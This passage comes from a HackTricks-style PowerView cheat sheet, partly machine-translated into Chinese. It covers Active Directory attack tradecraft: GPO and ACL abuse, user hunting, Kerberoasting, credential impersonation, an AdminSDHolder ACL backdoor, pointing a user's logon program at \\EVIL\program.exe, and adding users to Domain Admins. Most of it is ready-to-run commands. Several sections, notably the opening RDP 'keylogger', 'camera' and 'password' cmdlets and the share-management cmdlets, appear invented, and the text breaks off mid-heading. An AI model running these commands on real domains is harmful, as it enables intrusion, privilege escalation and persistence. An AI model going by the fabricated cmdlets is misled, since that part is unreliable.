#### 获取远程桌面会话的远程摄像头操作

使用`Get-NetRDPSessionRemoteCameraOperation`命令可以在指定远程桌面会话中执行远程摄像头操作。

```powershell
Get-NetRDPSessionRemoteCameraOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程麦克风操作

使用`Get-NetRDPSessionRemoteMicrophoneOperation`命令可以在指定远程桌面会话中执行远程麦克风操作。

```powershell
Get-NetRDPSessionRemoteMicrophoneOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程键盘记录操作

使用`Get-NetRDPSessionRemoteKeyloggerOperation`命令可以在指定远程桌面会话中执行远程键盘记录操作。

```powershell
Get-NetRDPSessionRemoteKeyloggerOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程浏览器历史记录操作

使用`Get-NetRDPSessionRemoteBrowserHistoryOperation`命令可以在指定远程桌面会话中执行远程浏览器历史记录操作。

```powershell
Get-NetRDPSessionRemoteBrowserHistoryOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程密码操作

使用`Get-NetRDPSessionRemotePasswordOperation`命令可以在指定远程桌面会话中执行远程密码操作。

```powershell
Get-NetRDPSessionRemotePasswordOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程凭据操作

使用`Get-NetRDPSessionRemoteCredentialOperation`命令可以在指定远程桌面会话中执行远程凭据操作。

```powershell
Get-NetRDPSessionRemoteCredentialOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程敏感数据操作

使用`Get-NetRDPSessionRemoteSensitiveDataOperation`命令可以在指定远程桌面会话中执行远程敏感数据操作。

```powershell
Get-NetRDPSessionRemoteSensitiveDataOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程文件传输操作

使用`Get-NetRDPSessionRemoteFileTransferOperation`命令可以在指定远程桌面会话中执行远程文件传输操作。

```powershell
Get-NetRDPSessionRemoteFileTransferOperation -SessionID <SessionID> -Operation <Operation> -FilePath <FilePath>
```

#### 获取远程桌面会话的远程网络流量操作

使用`Get-NetRDPSessionRemoteNetworkTrafficOperation`命令可以在指定远程桌面会话中执行远程网络流量操作。

```powershell
Get-NetRDPSessionRemoteNetworkTrafficOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程系统信息操作

使用`Get-NetRDPSessionRemoteSystemInfoOperation`命令可以在指定远程桌面会话中执行远程系统信息操作。

```powershell
Get-NetRDPSessionRemoteSystemInfoOperation -SessionID <SessionID> -Operation <Operation>
```

#### 获取远程桌面会话的远程进程内存转储操作

使用`Get-NetRDPSessionRemoteProcessDumpOperation`命令可以在指定远程桌面会话中执行远程进程内存转储操作。

```powershell
Get-NetRDPSessionRemoteProcessDumpOperation -SessionID <SessionID> -Operation <Operation> -ProcessID <ProcessID>
```

#### 获取远程桌面会话的远程文件下载操作

使用`Get-NetRDPSessionRemoteFileDownloadOperation`命令可以在指定远程桌面会话中执行远程文件下载操作。

```powershell
Get-NetRDPSessionRemoteFileDownloadOperation -SessionID <SessionID> -Operation <Operation> -FilePath <FilePath>
```

#### 获取远程桌面会
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### 组策略对象 - GPO

如果攻击者对 GPO 拥有**高权限**，他可以通过滥用 GPO 来进行**权限提升**，例如**添加用户权限**、在主机上**添加本地管理员用户**或**创建立即执行的计划任务**来执行某个操作。\
有关此内容的[**更多信息和滥用方法，请点击此链接**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation)。
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
学习如何在以下方面利用GPO和ACL的权限：

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### 共享文件和文件夹

PowerView提供了一些命令来查找和操作共享文件和文件夹。

#### 查找共享文件和文件夹

使用`Get-NetShare`命令可以列出当前系统上的共享文件和文件夹。

```powershell
Get-NetShare
```

#### 创建共享文件夹

使用`New-NetShare`命令可以创建一个新的共享文件夹。

```powershell
New-NetShare -Name "ShareName" -Path "C:\Path\To\Folder"
```

#### 删除共享文件夹

使用`Remove-NetShare`命令可以删除一个共享文件夹。

```powershell
Remove-NetShare -Name "ShareName"
```

#### 查找共享文件夹的访问权限

使用`Get-NetSharePermission`命令可以查找共享文件夹的访问权限。

```powershell
Get-NetSharePermission -Name "ShareName"
```

#### 添加共享文件夹的访问权限

使用`Add-NetSharePermission`命令可以添加共享文件夹的访问权限。

```powershell
Add-NetSharePermission -Name "ShareName" -Account "Domain\User" -AccessLevel "Read"
```

#### 删除共享文件夹的访问权限

使用`Remove-NetSharePermission`命令可以删除共享文件夹的访问权限。

```powershell
Remove-NetSharePermission -Name "ShareName" -Account "Domain\User"
```

#### 修改共享文件夹的访问权限

使用`Set-NetSharePermission`命令可以修改共享文件夹的访问权限。

```powershell
Set-NetSharePermission -Name "ShareName" -Account "Domain\User" -AccessLevel "FullControl"
```
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### 域信任

Domain trust is a relationship established between two domains that allows users from one domain to access resources in another domain. Trust relationships are commonly used in large organizations with multiple domains to facilitate collaboration and resource sharing.

域信任是在两个域之间建立的关系，允许一个域中的用户访问另一个域中的资源。信任关系通常在具有多个域的大型组织中使用，以促进协作和资源共享。

#### Types of Trust Relationships

#### 信任关系的类型

There are several types of trust relationships that can be established between domains:

可以在域之间建立多种类型的信任关系：

- One-way trust: In a one-way trust, Domain A trusts Domain B, but Domain B does not trust Domain A. This means that users in Domain A can access resources in Domain B, but users in Domain B cannot access resources in Domain A.

- 单向信任：在单向信任中，域A信任域B，但域B不信任域A。这意味着域A中的用户可以访问域B中的资源，但域B中的用户无法访问域A中的资源。

- Two-way trust: In a two-way trust, Domain A trusts Domain B, and Domain B trusts Domain A. This allows users in both domains to access resources in the other domain.

- 双向信任：在双向信任中，域A信任域B，域B也信任域A。这允许两个域中的用户都可以访问另一个域中的资源。

- Forest trust: A forest trust is established between two separate Active Directory forests. This allows users in one forest to access resources in the other forest.

- 林信任：林信任是在两个独立的Active Directory林之间建立的。这允许一个林中的用户访问另一个林中的资源。

#### Trust Enumeration with PowerView

#### 使用PowerView进行信任枚举

PowerView is a PowerShell tool that can be used to enumerate trust relationships in a Windows domain. It provides several functions that can be used to gather information about domain trusts.

PowerView是一个可以用于枚举Windows域中的信任关系的PowerShell工具。它提供了几个函数，可以用于收集有关域信任的信息。

To enumerate trust relationships using PowerView, you can use the `Get-NetDomainTrust` function. This function retrieves information about the trust relationships for the current domain or a specified domain.

要使用PowerView枚举信任关系，可以使用`Get-NetDomainTrust`函数。该函数检索当前域或指定域的信任关系信息。

Example usage:

示例用法：

```powershell
Get-NetDomainTrust
```

This command will retrieve information about the trust relationships for the current domain.

该命令将检索当前域的信任关系信息。

You can also specify a domain using the `-Domain` parameter:

还可以使用`-Domain`参数指定一个域：

```powershell
Get-NetDomainTrust -Domain domain.com
```

This command will retrieve information about the trust relationships for the specified domain.

该命令将检索指定域的信任关系信息。
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### 低挂果实

Low-hanging fruit refers to easy targets or vulnerabilities that can be exploited with minimal effort. These are typically the first things a hacker will look for when attempting to gain unauthorized access to a system or network. By identifying and exploiting low-hanging fruit, hackers can quickly gain a foothold and escalate their attack. It is important for system administrators to address these vulnerabilities to prevent unauthorized access.
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### 已删除的对象

PowerView提供了一些命令来查找和还原已删除的对象。这些命令可以帮助我们在目标环境中查找和恢复已删除的用户、组和计算机对象。

#### 查找已删除的对象

要查找已删除的对象，可以使用以下命令：

```powershell
Get-DomainDeletedObject
```

此命令将返回已删除的用户、组和计算机对象的列表，包括它们的名称、SID和删除时间。

#### 还原已删除的对象

要还原已删除的对象，可以使用以下命令：

```powershell
Restore-DomainDeletedObject -SamAccountName <DeletedObjectName>
```

将`<DeletedObjectName>`替换为要还原的已删除对象的名称。此命令将尝试还原指定名称的已删除对象。

请注意，还原已删除的对象可能需要适当的权限。
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 其他

#### SID 转换为名称

```powershell
ConvertFrom-SID -SID <SID>
```

此命令将给定的安全标识符（SID）转换为相应的名称。

#### 名称到SID

```powershell
ConvertTo-SID -Name <Name>
```

此命令将给定的名称转换为相应的安全标识符（SID）。
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
#### Kerberoast

Kerberoast是一种攻击技术，用于从域控制器中获取服务账户的哈希值。这些服务账户通常使用了弱密码，因此可以通过破解哈希值来获取明文密码。Kerberoast攻击利用了Kerberos协议中的漏洞，该协议用于在Windows域环境中进行身份验证。

攻击者可以使用PowerView工具中的`Get-DomainUser`命令来获取域中的服务账户。然后，使用`Get-DomainSPNTicket`命令来获取这些服务账户的服务票据。最后，使用`Invoke-Kerberoast`命令来破解这些服务票据的哈希值。

破解哈希值的过程可以在离线环境中进行，这意味着攻击者可以在自己的计算机上进行破解，而不会引起任何警报。一旦破解成功，攻击者就可以获取到服务账户的明文密码，从而进一步渗透目标网络。

为了防止Kerberoast攻击，可以采取以下措施：

- 使用强密码策略，确保所有服务账户的密码足够复杂和长。
- 定期更改服务账户的密码，以减少破解的风险。
- 监控域控制器日志，特别关注与Kerberos身份验证相关的事件。
- 使用工具如BloodHound来识别和修复域中存在的弱密码服务账户。

通过采取这些措施，可以有效减少Kerberoast攻击的风险，并提高目标网络的安全性。
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### 使用不同的凭据（参数）

To use different credentials with PowerView, you can specify the `-Credential` argument followed by the username and password. This allows you to authenticate with different credentials when executing commands. 

For example, to use the username `user1` and password `pass123` as the credentials, you can use the following syntax:

```powershell
Get-NetUser -Credential (New-Object System.Management.Automation.PSCredential('user1', (ConvertTo-SecureString 'pass123' -AsPlainText -Force)))
```

By providing different credentials, you can access resources and perform actions that are restricted to specific users or groups. This can be useful during penetration testing or when investigating security vulnerabilities.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### 模拟用户

To impersonate a user in PowerShell, you can use the `Invoke-UserImpersonation` function from the PowerView module. This function allows you to execute commands as if you were the specified user.

```powershell
Invoke-UserImpersonation -Username <username> -Command <command>
```

Replace `<username>` with the username of the user you want to impersonate, and `<command>` with the command you want to execute as that user.

For example, to impersonate the user "admin" and execute the command "whoami", you would use the following command:

```powershell
Invoke-UserImpersonation -Username admin -Command whoami
```

This can be useful for testing user permissions or performing actions on behalf of another user without needing their password.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### 设置值

```powershell
Set-Value -Name "Name" -Value "Value"
```

This command sets the value of a specified variable. Replace "Name" with the name of the variable and "Value" with the desired value.

此命令设置指定变量的值。将"Name"替换为变量的名称，将"Value"替换为所需的值。

#### Set registry values

```powershell
Set-ItemProperty -Path "RegistryPath" -Name "Name" -Value "Value"
```

This command sets the value of a specified registry key. Replace "RegistryPath" with the path to the registry key, "Name" with the name of the value, and "Value" with the desired value.

此命令设置指定注册表键的值。将"RegistryPath"替换为注册表键的路径，将"Name"替换为值的名称，将"Value"替换为所需的值。

#### Set file attributes

```powershell
Set-ItemProperty -Path "FilePath" -Name "Attributes" -Value "Value"
```

This command sets the attributes of a specified file. Replace "FilePath" with the path to the file, "Attributes" with the name of the attribute, and "Value" with the desired value.

此命令设置指定文件的属性。将"FilePath"替换为文件的路径，将"Attributes"替换为属性的名称，将"Value"替换为所需的值。

#### Set service properties

```powershell
Set-Service -Name "ServiceName" -StartupType "StartupType"
```

This command sets the startup type of a specified service. Replace "ServiceName" with the name of the service and "StartupType" with the desired startup type (e.g., Automatic, Manual, Disabled).

此命令设置指定服务的启动类型。将"ServiceName"替换为服务的名称，将"StartupType"替换为所需的启动类型（例如，Automatic，Manual，Disabled）。
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# ackdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
